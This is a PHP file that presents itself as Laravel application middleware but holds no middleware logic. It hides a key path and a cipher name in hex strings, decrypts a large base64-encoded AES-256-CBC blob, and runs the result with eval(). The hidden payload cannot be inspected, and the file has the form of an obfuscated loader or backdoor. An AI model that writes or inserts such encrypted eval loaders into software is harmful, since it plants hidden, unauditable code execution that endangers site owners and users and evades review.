<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('8xjBoWBKmavm05edeMdMxQ==');

$c=base64_decode(

'/7Nwb44mpm0b46w7tdVM+e3n+SCLR3TRnaJWGX2A7IFJAzMWtJfvYUDBtiA88KpudGh1s5uBqmW+' .
'59mk1cM/lP+QBf23SV3/kwg1Jn8A0E0EG9WftRuBiqnU9VgsnZD3qXSfVdKb5cxRx5UldgLC1Hfd' .
'0sjsFNi4TQKfSOSKm3VrVUl4JBZe1UYeaTRsqvV5dTeolxk2s/9MA0VEIUUFaofvbkOlToeDh8KQ' .
'JsSv9aiix+tFdeyZikDBhOhoDNbzYjkJMcgvwzrsz5O0sNQhdxSOyDqKl8qcPifFZecTfTUqPby4' .
'7lkNP9ZE008jHbbuULUBw9Mtd2KHu3s9FgxKIfwJKE0/eHN+mRsd5Ksym25I4Knqj2nHryqtIGDC' .
'ZsjrFBV5SmdcKix1L8EEYUH+TkC+SFHahz403OhLalim6HL3Fep5wfkD9Lmjlf587phgbcGvu7os' .
'nrtFMossrNqbJq13OwLjMblceKAR09LntTXc8kfdlWaWAWLV75wzOp1xtGfa6+vzunJSP+6PNzJr' .
'pvqz6r0zI4hYPNsvYSioDFa60AC6lyew71KDIFWKssiiMlk0ftmJbUdJAY7NmWQZdUMnD83r9SMR' .
'PzDQLam446m+ofCp8LAN0bBNAzV8QvQ0ucf5toRg+9sD8ucHHVFE7lXwmdsXWL2ZETRBK2ZT0iPv' .
'JqUc5oX031s23tFmkgNBPqHTe3y1PFc8vrG4MOEXvyO0CYMSuI2VjShSIxUzog/7a+hvYYP+RHom' .
'H+fAvYv+SpOJB5/eQo2PqChOwh7stvnYCDV/+gg3sxBcm6OF//MzXhlQtmgua1Ko3xRXwgRDQOU1' .
'uDN7OrjIr5a7+6vNYVwqirbixeGfJTH07RwEV8MxRjOYaDLowARLg4pc7ARNcfQZugVnk63dVzco' .
'+IypweLqCcLmsuE9K4stq7rc0Yh9BlJUttYaz2pGsE4CscIPTBNl1BVsJJ1afs0UZjfgAeawqxs2' .
'tDeQnnDLC6v99WVPYiFUNiH44bea4jHn2UyrI8Ok226GPZLVGMOFPxDCE9BH4IbJ3RhSqYuNMT/q' .
'/VaEhmYeIDsTab9akKAhlnS6cZiMetE3sF2Pal0xF3vgjTWI1sZjJXG8gj9YlmKrl5er8ywstd4+' .
'6JRm3+Qipu9BXa5YRCYJtJrr8RgB37Nm4L0wALA2mcUxFzgmjUWgKjg8xnqPByW8gQoF+DDZINE5' .
'728y25dzP4dNuSHN+q8hdnShNsYHoJCipRfNHhdgsJoxhZVrXVs7PBkJUaw3FXTBWqRKvT1h1pJ7' .
'ha72ekXB1itktxBCuKyuJqof5iojaJZKE+Llwu4RMDPQCfRHgJF1QTAODuvie4Ll3ZwrEURKbrol' .
'r0FHKR7tpu7IHM64KS3CJCVlVQ4H9lwwEmOnx5McOK5RiIb7n0/s93pONtns5H3CRe3Tl8R9vXeX' .
'fluiiVhWINTrhOJ+cbzyItFIFJSzoFAZdOpZTafcWX40CXrIWclMP7oXU6gwvesGDW5ZqYFbtEt8' .
'PZYZZHMUDbSvxizR6Yi4Xtq9svAhAQRB1jtK4zfCwC2Fbkt601ZJCocJAyzQ9zD8ZB4E+Txs/l9v' .
'+Gb/0vG56qaC5ZQZjc2JlxpTpPwRrxzgrg9XHXc4/2w011K74X/bdWU2XEeSa/HMbZAbSyoIT4w/' .
'HegYUBjAUSGmR1Cp+p0o8LJyon8MLzCD4+0vkijgpABpmdYPsnO7JTX+ERkN9P+jJsL78ZK22Ipt' .
'SkGsld0mfYJK7a30zrh5CPlW0o43MTY9wDwC6sYOqBA5Qdf3Yoar6tkDU1RobpM6CaY+VS+uyv5p' .
'E0Cy2peaA1uNNVGyB4majSn8eydn+SDSx69V6t/gQ1PB7UdnajXy8qlbNx4BaMdcQy3A7UCQUowz' .
'LrAnOkJO38VSQ9ZgGevUQbsAz2ROAv7uQ4eRMRfEZhDSZAx6aQJo0dj0WLLLnvdbRHJHaSCXjJTd' .
'rCnEIT/N5i+e6DZw0i8szUDVhqXMt1tdOy1s3SyhJnGcmzRs5v+p+g3H8n0yKZ0QV55Cm0iKY9aa' .
'zGGGX8JKRBNTKAfERP51gduKnywSR5oIRehe7w3O3YQcaClLjzXnYglBPxjabv4brltfQLyY6o5U' .
'mZPC5+Bj8iafzdnp9ZcmfiaUOOqkoz+YekaOYjZT1r04GI9afDjZsQJaPx9Md6gHM6qHsa9wSBE3' .
'C6xN05r22hOPZWA5N7B+w9ofsJAF9S8ECMR5DtxlaMdYjiZstaQWhLtxcBxJ8pw2OLFgxG87i6Is' .
'p4irOrrJJcaMZK5zE5+llXBgtAmL92Rdmprh8YeteTRol0tT0Vx148tRS62mO4PatIU+OTspR/ge' .
'zUpA06M5d46hi8sVk5JlhsRV2WQmye0LLgiGVaVdClaIlbZ5UJPiiNrBDqFEVZ3dnr/8BsafofBH' .
'iSLDVgQYpAeSPtGAtyjok0RF0g/RVZHtqYmgOjliKVT4WtG9u051YKqQ4TGvHTILe9eqrIcVms8e' .
'QHWpmcYc3ktsjf3BijwhO4EwleASr7dnZi/0NyUwLnchjNTf5+eyE6iOKsUnQq/d3mejLie8hh4L' .
'yTPW3Vgvf5g2e/4U7BwllH2ML41wz2S7PTZtS6EHRGMRMW58koDzIf2c8rmVKnfdV6riaMd4EBIX' .
'odDjh0rFcqisolbhZqcKxYrF53fmH4kxWbcT0sgPFbmK+pF7ozrn6P/Dm+6UUp8rBp/4cOzPKp6y' .
'iC8ESMZwv8vSpDOTIDSsN8XkNOHGpxF5sjw59a3vv97JukGXhkC3A2RTJ+EaWlfe3QJ1OgwPr26G' .
'QI9yz25PoFZOSuI6nswic15aak97f03R32e6PUNYZ68u/dnNY4KvV1/nFFCVsz3SzPqeoomVVusb' .
'4oCmcO0DIlkal5A+KsU5p+m22147iOey5/mwnswLmz72MfXH/cXT8UmI+a6N+OqSYwb3/r/dkuVO' .
'WikvufAt+Qcpkq8TCOscEa0AIMTU/FKRQBaOppz+OvTkJwjsyWeBj+MKPlWGqr6JwfzLicnEMP3b' .
'P5vIpmecPMF8z3OzrU/Q5BgAdWLsf3+o7pCK/IqDcLdocq9dC7ZaF5DcUydKzShNSiB6aTIMGrD6' .
'90QcwYgwWUYScJMum7nWXY08ZDLnf9XJAmnMrP2HA6t1E7I7v3XHuqGSJmb5+XzMKg5W3lk3Z9kg' .
'tsvf5MNxfOQ0Zx/VDjCHHkx9J3DsoWXCQ2bzULyY5/LposzmM2z1B6rAjawWYEvb1oKrr29p96Wj' .
'B7BBRvMSPSMiJ8nCaJra5AcHfDNbo03E0KWjKmOXN/rCATFyFlRq2DviJj1LIEKHdKurKjKeeXiF' .
'm6QZOnvpitHLkdrg3pzcXPBKJd0qnNYFNfXaseoJmYfGUQC7bElxEDmAmPn6ApWed3Y9LHUV814F' .
'frl4+hC/HH206y+yxmaApzu0MhPRmOb9b4D4odP5fA5iuwuRXkD574TE6b3nxANzjHKD3RqhhSaL' .
'PnFZ5f+bPJpp0LQU7d9uGbECjDRiXP1+X89J3dvG3Lem1xSlmLN9uR5cHcbFiCOqvEPO4hALiOBc' .
'2rXvDfG5yyuUa9RRajk+/tDVfwpnkpQxEaSsz9L0g5CbPl24qVU+btZnUd8ucHxMhJ1YBbar0PXt' .
'032L7vnvJ7niXr+1+9EOjavGmYmvUNjBYbOfT34A3ovMYqNbrfmjAklxLmJ1kaKo/f4tCQ8z7rE4' .
'NqkhHWEojksTkVdLNsDeQLOzrANh4LhBA49kJo/YY0dpSm11g2CLFPuvmCfhmk9rbQ2zLcjXjwo+' .
'ymqi2k6RI0wT+dN4dO65oy+tMSnxz2NKv5lwrM+r'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

